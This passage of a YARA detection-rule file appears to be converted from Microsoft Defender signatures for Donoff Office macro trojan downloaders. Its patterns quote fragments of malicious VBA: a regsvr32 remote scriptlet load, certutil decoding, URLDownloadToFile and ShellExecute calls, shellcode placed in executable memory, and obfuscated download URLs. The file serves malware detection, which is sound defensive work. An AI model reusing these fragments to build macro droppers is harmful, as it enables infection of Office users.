        $x_1_2 = ".Run StrReverse(\"\"\" ridkm\" &" ascii //weight: 1
        $x_1_3 = ".Run StrReverse(\"\"\" \"\"\"\" trats\" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BB_2147709164_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BB"
        threat_id = "2147709164"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4c 69 62 20 22 75 72 6c 6d 6f 6e 22 20 41 6c 69 61 73 20 22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 01 00 22 20 28 42 79 56 61 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e 20 53 68 65 6c 6c 45 78 65 63 75 74 65 01 00 20 4c 69 62 20 22 73 68 65 6c 6c 33 32 2e 64 6c 6c 22 20 28 42 79 56 61 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {22 68 74 74 70 3a 22 20 26 20 [0-8] 20 26 20 22 [0-32] 22 20 26 20 [0-16] 20 26 20 22 63 6f 6d 22 20 26 20 [0-8] 20 26 20 22 2f [0-16] 2e 65 78 22}  //weight: 1, accuracy: Low
        $x_1_4 = {45 76 61 6c 75 61 74 65 28 03 00 20 2d 20 03 00 29 2c 20 45 76 61 6c 75 61 74 65 28 03 00 20 2d 20 03 00 29 29 20 3d 20 45 76 61 6c 75 61 74 65 28}  //weight: 1, accuracy: Low
        $x_1_5 = "file_to_save, \"mini\", fname" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BD_2147709945_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BD"
        threat_id = "2147709945"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "f5DTYYTc6fG = \"T\" + \"E\" + \"M\" + \"P\"" ascii //weight: 1
        $x_1_2 = "uug666666yfasd = Environ(f5DTYYTc6fG)" ascii //weight: 1
        $x_1_3 = "dsfffffffff.Open uug666666yfasd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BE_2147710231_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BE"
        threat_id = "2147710231"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Split(\"728_812_812_784_406_329_329_" ascii //weight: 1
        $x_1_2 = ", \"::\")" ascii //weight: 1
        $x_1_3 = "= CreateObject(" ascii //weight: 1
        $x_1_4 = "\"_\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BE_2147710231_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BE"
        threat_id = "2147710231"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 70 6c 69 74 28 [0-32] 2e 54 65 78 74 2c 20 22 3a 3a 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 30 29 29 [0-48] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 31 29 29 [0-48] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 32 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 4f 70 65 6e [0-32] 2c 20 [0-32] 2c 20 46 61 6c 73 65 [0-48] 2e 53 65 6e 64 [0-32] 47 6f 54 6f}  //weight: 1, accuracy: Low
        $x_1_4 = {28 36 29 29 [0-32] 20 3d 20 [0-48] 20 3d 20 [0-16] 20 2b 20 [0-32] 28 31 32 29}  //weight: 1, accuracy: Low
        $x_1_5 = "SendPacket \"\", \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BH_2147710789_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BH"
        threat_id = "2147710789"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= GetObject(fqRikg.dujSGPkVeY(\"wMiYnom0gGmYtdsj:GoH\", 182))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BJ_2147711123_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BJ"
        threat_id = "2147711123"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 1f 00 20 45 72 72 2e 44 65 73 63 72 69 70 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = "Err.Raise Number:=1" ascii //weight: 1
        $x_1_3 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 0f 00 28 42 79 56 61 6c 20 0f 00 20 41 73 20 56 61 72 69 61 6e 74 2c 20 42 79 56 61 6c 20 0f 00 20 41 73 20 56 61 72 69 61 6e 74 2c 20 42 79 56 61 6c 20 0f 00 20 41 73 20 56 61 72 69 61 6e 74 29 20 41 73 20 56 61 72 69 61 6e 74 03 00 53 65 74 20 0f 00 20 3d 20 43 61 6c 6c 42 79 4e 61 6d 65 28 0f 00 2c 20 0f 00 2c 20 31 2c 20 0f 00 29}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 76 61 74 65 20 46 75 6e 63 74 69 6f 6e 20 0f 00 28 29 20 41 73 20 42 6f 6f 6c 65 61 6e 03 00 0f 00 20 3d 20 49 6e 53 74 72 28 31 2c 20 0f 00 2e 0f 00 2c 20 0f 00 28 05 00 2c 20 0f 00 2e 0f 00 29 29 20 3c 3e 20 0f 00 2e 0f 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BK_2147711301_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BK"
        threat_id = "2147711301"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 46 75 6e 63 74 69 6f 6e 20 6f 52 73 45 72 53 33 6e 28 29 20 41 73 20 49 6e 74 65 67 65 72 03 00 6f 52 73 45 72 53 33 6e 20 3d 20 31 35 30 20 2b 20 34 33 20 2b 20 31 20 2b 20 36 03 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {65 33 37 6a 31 75 47 76 41 4f 3a 03 00 47 32 58 6c 51 4d 61 20 3d 20 28 57 6d 4f 6e 48 66 20 2d 20 68 68 4e 37 45 36 61 49 29 20 2f 20 59 63 51 63 47 41 36 75 49 7a 31 35 55 28 47 52 6c 4f 56 61 68 39 4a 29 03 00 4c 38 66 52 6c 77 45 68 77 53 54 49 5a 37}  //weight: 1, accuracy: Low
        $x_1_3 = {65 33 37 6a 31 75 47 76 41 4f 3a 03 00 77 56 70 74 4f 6c 20 3d 20 73 56 71 56 30 52 39 6d 59 20 26 20 70 35 49 77 72 52 55 4a 57 62 44 34 58 03 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = "n9MfvP6j = Nubw1cQWdNTiYi - ((Nubw1cQWdNTiYi \\ lciGA4DtcMOYG5) * lciGA4DtcMOYG5)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BL_2147711302_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BL"
        threat_id = "2147711302"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "CallByName OLw8oOwCUo5k, IqnTf0m3r4VkV, 4, W4KfettA2Yz" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BL_2147711302_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BL"
        threat_id = "2147711302"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {71 4d 33 6d 78 32 6e 3a 03 00 61 38 6c 6d 68 44 50 62 45 6c 7a 76 20 3d 20 28 6e 4e 66 4a 39 71 42 41 44 69 47 50 5a 68 20 2d 20 64 77 77 47 51 70 41 31 4a 36 30 76 4e 4b 45 29 20 2f 20 10 00 2e 78 77 69 4a 54 4d 42 42 69 57 37 4d 28 57 78 63 56 4f 50 65 52 47 69 72 41 50 41 29}  //weight: 1, accuracy: Low
        $x_1_2 = {46 6f 72 20 72 37 37 6c 49 67 4c 63 43 38 42 49 54 53 35 20 3d 20 31 20 54 6f 20 61 38 6c 6d 68 44 50 62 45 6c 7a 76 03 00 6a 73 65 41 44 51 7a 4a 43 6a 63 69 53 20 3d 20 10 00 2e 75 56 62 50 56 72 51 28 57 78 63 56 4f 50 65 52 47 69 72 41 50 41 2c 20 72 37 37 6c 49 67 4c 63 43 38 42 49 54 53 35 29 20 26 20 6a 73 65 41 44 51 7a 4a 43 6a 63 69 53}  //weight: 1, accuracy: Low
        $x_1_3 = "j9L1rzzLDTMV = YxIhPoFG0vJqvc9 - ((YxIhPoFG0vJqvc9 \\ L0KuOT) * L0KuOT)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BM_2147711305_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BM"
        threat_id = "2147711305"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {28 29 20 41 73 20 4f 62 6a 65 63 74 0d 0a 44 69}  //weight: 1, accuracy: High
        $x_1_2 = {45 72 72 2e 52 61 69 73 65 20 4e 75 6d 62 65 72 3a 3d 31 0d 0a}  //weight: 1, accuracy: High
        $x_1_3 = "= \"\" & " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BM_2147711305_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BM"
        threat_id = "2147711305"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4d 4a 67 76 68 6f 3a 03 00 7a 4d 70 64 53 45 32 56 45 56 57 58 66 20 3d 20 28 50 36 74 77 65 72 77 6f 20 2d 20 51 31 77 78 75 34 72 31 43 66 42 29 20 2f 20 10 00 2e 6b 68 54 57 68 4a 63 63 6d 68 69 69 68 28 67 49 37 4d 45 63 6d 29}  //weight: 1, accuracy: Low
        $x_1_2 = "H5ZfLEQd8S = XRZbA6(MKBEq3, (dbvzvFKy * Q1wxu4r1CfB) + UMEDFgt7BiUpQzh)" ascii //weight: 1
        $x_1_3 = "rvtuDBt5 = OYaPyGtDKmexsWm - ((OYaPyGtDKmexsWm \\ jeEai6TNCZlwU9) * jeEai6TNCZlwU9)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BN_2147711306_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BN"
        threat_id = "2147711306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {22 4e 65 77 4d 61 63 72 6f 73 22 0d 0a 53 75 62}  //weight: 1, accuracy: High
        $x_1_2 = {23 49 66 20 57 69 6e 36 34 20 54 68 65 6e 0d 0a 50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BN_2147711306_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BN"
        threat_id = "2147711306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SXssDbgwzO22ebb = SmHE58GEq9I - ((SmHE58GEq9I \\ acPwg1) * acPwg1)" ascii //weight: 1
        $x_1_2 = "jf9UXLdNGTGeYxz = (KzNqE8t6TP2Bv63 - E3Ifwmhhuyk) / rCgNKUIJTLW" ascii //weight: 1
        $x_1_3 = "YAa85u8(YnJhk3F7drfLv, (JWcbfQld9i0 * E3Ifwmhhuyk) + qQc8j5iRlncc))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BO_2147711309_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BO"
        threat_id = "2147711309"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Mid(shellCode," ascii //weight: 1
        $x_1_2 = "rL, zL, &H5000, &H1000, &H40)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BO_2147711309_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BO"
        threat_id = "2147711309"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 53 68 65 6c 6c 28 [0-32] 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Environ$(Chr(84) + Chr(77) + Chr(80))" ascii //weight: 1
        $x_1_3 = "Chr(46) + Chr(101) + Chr(120) + Chr(101)" ascii //weight: 1
        $x_1_4 = "= Chr(104) + Chr(116) + Chr(116) + Chr(112) + Chr(115) + Chr(58) + Chr(47) + Chr(47)" ascii //weight: 1
        $x_1_5 = "+ Chr(46) + Chr(115) + Chr(99) + Chr(114)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BP_2147711409_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BP"
        threat_id = "2147711409"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {72 65 67 73 76 72 33 32 20 2f 73 20 2f 6e 20 2f 75 20 2f 69 3a 68 74 74 70 3a 2f 2f [0-45] 2e 73 63 74 20 73 63 72 6f 62 6a 2e 64 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BP_2147711409_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BP"
        threat_id = "2147711409"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "iQG8jgGcp1ULP = whpY6mbtQIRH95z - ((whpY6mbtQIRH95z \\ fCKrqm) * fCKrqm)" ascii //weight: 1
        $x_1_2 = "RqOxdJ6a(HJREtbS, (JVtuBuDzd6oBTH * MjlIiLodjsaz) + wMiQcqUlPfou9Nf)" ascii //weight: 1
        $x_1_3 = "TtvGUQU3 = (NuNdHEvhpwc - MjlIiLodjsaz) / huptlISM5(BNNwSu3olEFw0wi)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BQ_2147711410_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BQ"
        threat_id = "2147711410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ShellExecute(0, \"open\", \"certutil.exe\", \"-decode" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BQ_2147711410_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BQ"
        threat_id = "2147711410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "\"\\scaled.exe\"" ascii //weight: 2
        $x_1_2 = "\"quadrifoliolate" ascii //weight: 1
        $x_1_3 = "ExecQuery(\"Select * from WIN32_Product WHERE Name LIKE 'Python %" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_BQ_2147711410_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BQ"
        threat_id = "2147711410"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RDBNre6W = QeOGWtzAZ9b2u3Z - ((QeOGWtzAZ9b2u3Z \\ Il4bybZ1uE7) * Il4bybZ1uE7)" ascii //weight: 1
        $x_1_2 = "qi2PDDq1w = (R8C59aFgB - S9sbmlUnIuC) / KxwS1H69LkW1Xo(Ln42iyY)" ascii //weight: 1
        $x_1_3 = "YLBKA9Svj4C(olI06bWYi8XkK, (gXdxnCLDYR0NeBd * S9sbmlUnIuC) + GEnlXMQ3pQy)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BR_2147711477_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BR"
        threat_id = "2147711477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bNbBia0 = msTTGZuAxJt - ((msTTGZuAxJt \\ fOoV9tDQ) * fOoV9tDQ)" ascii //weight: 1
        $x_1_2 = "FLD1VQ = (a4uabGp - E14UaSlx0y) / tIpuF4GCfKryVUs(FrcnGqx2)" ascii //weight: 1
        $x_1_3 = "exTjCPTXwE9ft(MPqqH6, (Hb3jEEWxy * E14UaSlx0y) + i0SLABS)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BR_2147711477_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BR"
        threat_id = "2147711477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "77u/XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xUZW1wbGF0ZXNcTmV3IE1pY3Jvc29mdCBFeGNlbCBXb3Jrc2hlZXQueGxz" ascii //weight: 1
        $x_1_2 = "77u/XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xUZW1wbGF0ZXNcbmV3LnRtcA==" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BT_2147712040_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BT"
        threat_id = "2147712040"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= InStr(1," ascii //weight: 1
        $x_1_2 = "= Mid(" ascii //weight: 1
        $x_1_3 = "= Len(" ascii //weight: 1
        $x_1_4 = {2e 53 70 61 77 6e 49 6e 73 74 61 6e 63 65 5f 0d 0a [0-15] 2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 30}  //weight: 1, accuracy: Low
        $x_1_5 = {20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-15] 29 0d 0a [0-15] 2e 43 72 65 61 74 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BU_2147712372_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BU"
        threat_id = "2147712372"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Asc(\"0\") To Asc(\"9\"):" ascii //weight: 1
        $x_1_2 = {4c 6f 6f 70 [0-5] 10 00 1f 00 20 3d 20 22 5c 66 69 69 75 64 66 38 33 2e 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BU_2147712372_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BU"
        threat_id = "2147712372"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "= Asc(\"0\") To Asc(\"9\"):" ascii //weight: 2
        $x_1_2 = "= UserForm1.ComboBox1.Text" ascii //weight: 1
        $x_3_3 = "And 3) * &H40) Or" ascii //weight: 3
        $x_1_4 = "For Output As #" ascii //weight: 1
        $x_1_5 = ", vbHide" ascii //weight: 1
        $x_1_6 = "= UserForm1.ComboBox3.Text" ascii //weight: 1
        $x_1_7 = "= 0 To 127:" ascii //weight: 1
        $x_1_8 = "Sub Document_Open()" ascii //weight: 1
        $x_1_9 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 1 of ($x_2_*) and 6 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_BV_2147713053_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BV"
        threat_id = "2147713053"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 42 79 4e 61 6d 65 28 [0-16] 2c 20 22 47 65 74 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 22 2c 20 [0-10] 2c 20 [0-3] 20 2d 20 [0-3] 29}  //weight: 1, accuracy: Low
        $x_1_2 = "+ StrReverse(\"tcejb\")" ascii //weight: 1
        $x_1_3 = {2b 20 53 74 72 52 65 76 65 72 73 65 28 22 [0-8] 22 29 20 2b 20 4d 69 64 28 22 [0-32] 22 2c 20 ?? 2c 20 ?? 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 22 [0-8] 22 29 20 2b 20 4c 63 61 73 65 28 22 [0-8] 22 29 20 2b 20 52 65 70 6c 61 63 65 28 22 [0-16] 22 2c 20 22 [0-16] 22 2c}  //weight: 1, accuracy: Low
        $x_1_5 = "= Lcase(\"RU\") + Ucase(\"N\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BX_2147716134_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BX"
        threat_id = "2147716134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 68 61 74 69 73 64 61 73 20 3d 20 6d 61 73 68 69 6e 61 28 77 68 61 74 69 73 64 61 73 2c 20 22 [0-8] 22 2c 20 22 4d 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {77 68 61 74 69 73 64 61 73 20 3d 20 6d 61 73 68 69 6e 61 28 22 [0-8] 69 63 72 6f [0-8] 6f 66 74 2e 58 [0-8] 4c 48 54 54 50 [0-8] 41 64 6f 64 62}  //weight: 1, accuracy: Low
        $x_1_3 = "Set hasHasHas_to_fiddle = CreateObject(somebodyBloody(2))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

